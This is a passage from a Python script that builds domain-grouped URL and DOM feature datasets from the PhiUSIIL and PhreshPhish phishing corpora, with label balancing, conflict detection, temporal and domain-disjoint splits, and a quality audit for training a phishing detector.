                "path": path.replace("\\", "/"),
                "size_bytes": os.path.getsize(path),
                "sha256": compute_file_sha256(path),
                "modified_at": datetime.fromtimestamp(os.path.getmtime(path), tz=timezone.utc).isoformat(),
            }
    with open(os.path.join(INTEL_DIR, "runtime_intel_manifest.json"), "w", encoding="utf-8") as f:
        json.dump(meta, f, indent=2)


def build_all_datasets(
    max_phiusiil: int = 60000,
    max_phreshphish: int = 8000,
    train_shards: int = 4,
    test_shards: int = 2,
    refresh_phreshphish: bool = False,
) -> dict:
    """Build v3.0 URL, DOM, combined, operational, and uncertain datasets + quality audit report."""
    os.makedirs(RAW_DIR, exist_ok=True)
    os.makedirs(EXTERNAL_DIR, exist_ok=True)
    os.makedirs(PROCESSED_DIR, exist_ok=True)
    ts = _now_iso()

    custom_df, html_fixtures, operational_df = ensure_custom_verified_fixtures()
    phresh_df = fetch_phreshphish_parquet_corpus(
        train_shards=train_shards,
        test_shards=test_shards,
        max_samples=max_phreshphish,
        refresh=refresh_phreshphish,
    )
    feeds_df, uncertain_df = fetch_external_threat_and_benign_feeds()
    export_runtime_intel_manifest()

    # 1. Load genuine PhiUSIIL records (read-only on raw CSV; strips synthetic prefixes)
    phi_records: list[dict] = []
    if os.path.exists(PHIUSIIL_PATH):
        print(f"Loading PhiUSIIL raw CSV from {PHIUSIIL_PATH}...", flush=True)
        raw_phi = pd.read_csv(PHIUSIIL_PATH, usecols=["URL", "Domain", "label"])
        raw_phi = raw_phi[~raw_phi["Domain"].astype(str).str.startswith(SYNTHETIC_PREFIXES)].copy()
        raw_phi = raw_phi.drop_duplicates(subset=["URL"], keep="first")
        raw_phi["root_domain"] = raw_phi["Domain"].astype(str).map(extract_root_domain)
        raw_phi = raw_phi.groupby("root_domain", group_keys=False).head(2)
        if len(raw_phi) > max_phiusiil:
            n_half = max_phiusiil // 2
            p0 = raw_phi[raw_phi["label"] == 0].sample(n=min(n_half, int((raw_phi["label"] == 0).sum())), random_state=42)
            p1 = raw_phi[raw_phi["label"] == 1].sample(n=min(n_half, int((raw_phi["label"] == 1).sum())), random_state=42)
            raw_phi = pd.concat([p0, p1], ignore_index=True)

        for u_val, dom_val, lbl_val, root_val in zip(
            raw_phi["URL"], raw_phi["Domain"], raw_phi["label"], raw_phi["root_domain"]
        ):
            nu = normalize_url(str(u_val))
            dom = str(dom_val).lower().strip()
            lbl = int(lbl_val)
            primary = "benign" if lbl == 1 else "phishing"
            op_st = "Benign" if lbl == 1 else "Malicious"
            cat = _infer_url_taxonomy_category(nu, primary, "phiusiil")
            phi_records.append({
                "url": nu, "domain": dom, "root_domain": root_val,
                "source": "phiusiil", "collection_timestamp": ts,
                "collection_method": "phiusiil_verified_csv",
                "feature_extraction_version": URL_FEATURE_VERSION,
                "content_sha256": "", "verification_status": "verified",
                "operational_status": op_st, "threat_category": cat,
                "html_available": False, "primary_label": primary,
                "risk_labels": primary, "binary_label": lbl, "confidence": 1.0,
                "evidence": "Verified ground-truth record from PhiUSIIL Phishing URL Dataset.",
                "date": "2024-01-01",
            })
        print(f"Prepared {len(phi_records):,} verified PhiUSIIL records.", flush=True)
    phi_meta_df = pd.DataFrame(phi_records)

    # 2. Build expanded DOM dataset (offline static fixtures + PhreshPhish Parquet shards)
    dom_rows: list[dict] = []
    phresh_meta_rows: list[dict] = []

    for fx in html_fixtures:
        nu = normalize_url(fx["url"])
        h = (urlparse(nu).hostname or "").lower()
        dom_feats = extract_dom_features_from_html(nu, fx["html"], analysis_mode="static_html")
        dom_feats.pop("unavailable_signals", None)
        dom_feats.pop("analysis_mode", None)
        dom_feats.update({
            "url": nu, "domain": h, "root_domain": extract_root_domain(h),
            "source": "custom_verified_fixture",
            "collection_timestamp": ts,
            "collection_method": "offline_static_fixture",
            "feature_extraction_version": DOM_FEATURE_VERSION,
            "content_sha256": compute_content_sha256(fx["html"]),
            "verification_status": "verified",
            "operational_status": fx["operational_status"],
            "threat_category": fx["threat_category"],
            "primary_label": fx["primary_label"],
            "risk_labels": fx["risk_labels"],
            "binary_label": fx["binary_label"],
            "confidence": fx["confidence"],
            "date": ts[:10],
        })
        dom_rows.append(dom_feats)

    if not phresh_df.empty:
        phresh_df = phresh_df.copy()
        phresh_df["_root"] = phresh_df["url"].map(
            lambda u: extract_root_domain(urlparse(normalize_url(str(u))).hostname or "")
        )
        # Domain cap prevents single hosting template from dominating a partition
        phresh_df = phresh_df.groupby("_root", group_keys=False).head(2).drop(columns=["_root"]).reset_index(drop=True)
        if len(phresh_df) > max_phreshphish:
            half_p = max_phreshphish // 2
            lbl_norm = phresh_df["label"].astype(str).str.lower().str.strip()
            p_ben = phresh_df[lbl_norm == "benign"]
            p_phi = phresh_df[lbl_norm != "benign"]
            p_ben_s = p_ben.sample(n=min(half_p, len(p_ben)), random_state=42)
            p_phi_s = p_phi.sample(n=min(half_p, len(p_phi)), random_state=42)
            phresh_df = pd.concat([p_ben_s, p_phi_s], ignore_index=True)

        print(f"Extracting DOM features for {len(phresh_df):,} domain-capped PhreshPhish HTML documents...", flush=True)

        for idx_p, pr in enumerate(phresh_df.itertuples(index=False)):
            if idx_p > 0 and idx_p % 500 == 0:
                print(f"  DOM feature extraction progress: {idx_p:,}/{len(phresh_df):,}", flush=True)
            nu = normalize_url(str(pr.url))
            h = (urlparse(nu).hostname or "").lower()
            root = extract_root_domain(h)
            is_benign = str(pr.label).lower() == "benign"
            primary = "benign" if is_benign else "phishing"
            op_st = "Benign" if is_benign else "Malicious"
            target_brand = getattr(pr, "target", None)
            risks = ["benign"] if is_benign else ["phishing"]
            if not is_benign and target_brand and str(target_brand).lower() != "none":
                risks.append("brand_impersonation")
            html_str = str(pr.html)
            chash = str(getattr(pr, "sha256", "") or "") or compute_content_sha256(html_str)
            date_val = str(getattr(pr, "date", ts[:10]) or ts[:10])[:10]
            split_orig = str(getattr(pr, "split_origin", "train") or "train")
            cat = _infer_url_taxonomy_category(nu, primary, "phreshphish")

            dom_feats = extract_dom_features_from_html(nu, html_str, analysis_mode="static_html")
            dom_feats.pop("unavailable_signals", None)
            dom_feats.pop("analysis_mode", None)
            dom_feats.update({
                "url": nu, "domain": h, "root_domain": root,
                "source": "phreshphish",
                "collection_timestamp": ts,
                "collection_method": f"huggingface_parquet_{split_orig}",
                "feature_extraction_version": DOM_FEATURE_VERSION,
                "content_sha256": chash,
                "verification_status": "verified",
                "operational_status": op_st,
                "threat_category": cat,
                "primary_label": primary,
                "risk_labels": "|".join(risks),
                "binary_label": 1 if is_benign else 0,
                "confidence": 0.98,
                "date": date_val,
            })
            dom_rows.append(dom_feats)
            phresh_meta_rows.append({
                "url": nu, "domain": h, "root_domain": root,
                "source": "phreshphish", "collection_timestamp": ts,
                "collection_method": f"huggingface_parquet_{split_orig}",
                "feature_extraction_version": URL_FEATURE_VERSION,
                "content_sha256": chash,
                "verification_status": "verified",
                "operational_status": op_st,
                "threat_category": cat,
                "html_available": True,
                "primary_label": primary,
                "risk_labels": "|".join(risks),
                "binary_label": 1 if is_benign else 0,
                "confidence": 0.98,
                "evidence": f"PhreshPhish verified {primary} HTML sample" + (f" targeting {target_brand}" if target_brand else ""),
                "date": date_val,
            })

    dom_dataset_raw = pd.DataFrame(dom_rows)
    dom_dataset, dom_conflicts = detect_conflicting_labels(dom_dataset_raw)
    validate_dataset_schema(dom_dataset, DOM_FEATURE_COLUMNS + ["url", "root_domain", "binary_label", "primary_label", "content_sha256"])
    dom_dataset.to_csv(os.path.join(PROCESSED_DIR, "dom_dataset.csv"), index=False)

    # Reserve chronological temporal test FIRST and exclude its root_domains from train/val/test to prevent ANY domain overlap
    phresh_only_dom = dom_dataset[dom_dataset["source"] == "phreshphish"]
    dom_core = dom_dataset
    if len(phresh_only_dom) >= 40:
        _, dom_temp_test = temporal_train_test_split(phresh_only_dom, date_col="date", test_fraction=0.18)
        temp_domains = set(dom_temp_test["root_domain"].dropna().astype(str).str.lower())
        dom_core = dom_dataset[~dom_dataset["root_domain"].astype(str).str.lower().isin(temp_domains)].reset_index(drop=True)
        dom_temp_test.to_csv(os.path.join(PROCESSED_DIR, "dom_temporal_test.csv"), index=False)

    dom_train, dom_val, dom_test = domain_grouped_train_val_test_split(dom_core, group_col="root_domain")
    if len(phresh_only_dom) >= 40:
        verify_domain_disjoint(dom_train, dom_val, dom_temp_test, group_col="root_domain")
        verify_domain_disjoint(dom_train, dom_test, dom_temp_test, group_col="root_domain")
    dom_train.to_csv(os.path.join(PROCESSED_DIR, "dom_train.csv"), index=False)
    dom_val.to_csv(os.path.join(PROCESSED_DIR, "dom_val.csv"), index=False)
    dom_test.to_csv(os.path.join(PROCESSED_DIR, "dom_test.csv"), index=False)

    # 3. Combine verified metadata -> resolve conflicts -> extract PSL URL features
    phresh_meta_df = pd.DataFrame(phresh_meta_rows)
    combined_raw = pd.concat([custom_df, phresh_meta_df, feeds_df, phi_meta_df], ignore_index=True)
    combined_df, url_conflicts = detect_conflicting_labels(combined_raw)
    validate_dataset_schema(
        combined_df,
        ["url", "domain", "root_domain", "source", "verification_status", "operational_status", "threat_category", "primary_label", "binary_label"],
    )
    combined_df.to_csv(os.path.join(PROCESSED_DIR, "combined_dataset.csv"), index=False)

    if not uncertain_df.empty:
        uncertain_df.drop_duplicates(subset=["url"], keep="first").to_csv(
            os.path.join(PROCESSED_DIR, "uncertain_samples.csv"), index=False
        )
    operational_df.to_csv(os.path.join(PROCESSED_DIR, "operational_status_samples.csv"), index=False)

    print(f"Extracting PSL-aligned URL features for {len(combined_df):,} verified URLs...")
    url_feats_list = [extract_url_features(u) for u in combined_df["url"]]
    url_feats_df = pd.DataFrame(url_feats_list)
    meta_cols = ["url", "domain", "root_domain", "source", "operational_status", "threat_category", "primary_label", "risk_labels", "binary_label", "date"]
    url_dataset = pd.concat([url_feats_df[URL_FEATURE_COLUMNS], combined_df[meta_cols]], axis=1)
    validate_dataset_schema(url_dataset, URL_FEATURE_COLUMNS + ["url", "root_domain", "binary_label", "primary_label"])
    url_dataset.to_csv(os.path.join(PROCESSED_DIR, "url_dataset.csv"), index=False)

    url_train, url_val, url_test = domain_grouped_train_val_test_split(url_dataset, group_col="root_domain")
    url_train.to_csv(os.path.join(PROCESSED_DIR, "url_train.csv"), index=False)
    url_val.to_csv(os.path.join(PROCESSED_DIR, "url_val.csv"), index=False)
    url_test.to_csv(os.path.join(PROCESSED_DIR, "url_test.csv"), index=False)

    audit_summary = run_dataset_quality_audit(
        combined_df=combined_df,
        url_df=url_dataset,
        dom_df=dom_dataset,
        uncertain_df=uncertain_df,
        operational_df=operational_df,
        url_splits=(url_train, url_val, url_test),
        dom_splits=(dom_train, dom_val, dom_test),
        conflict_stats={"url": url_conflicts, "dom": dom_conflicts, **url_conflicts},
        url_feature_cols=URL_FEATURE_COLUMNS,
        dom_feature_cols=DOM_FEATURE_COLUMNS,
    )
    print("Dataset v3.0 Engineering Summary:", json.dumps({k: v for k, v in audit_summary.items() if k not in ("url_outliers", "dom_outliers")}, indent=2))
    return audit_summary


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Build separated, domain-grouped v3.0 security datasets.")
    parser.add_argument("--max-phiusiil", type=int, default=60000)
    parser.add_argument("--max-phreshphish", type=int, default=8000)
    parser.add_argument("--train-shards", type=int, default=4, help="Number of PhreshPhish Parquet train shards.")
    parser.add_argument("--test-shards", type=int, default=2, help="Number of PhreshPhish Parquet test shards.")
    parser.add_argument("--refresh-phreshphish", action="store_true")
    args = parser.parse_args()
    build_all_datasets(
        max_phiusiil=args.max_phiusiil,
        max_phreshphish=args.max_phreshphish,
        train_shards=args.train_shards,
        test_shards=args.test_shards,
        refresh_phreshphish=args.refresh_phreshphish,
    )
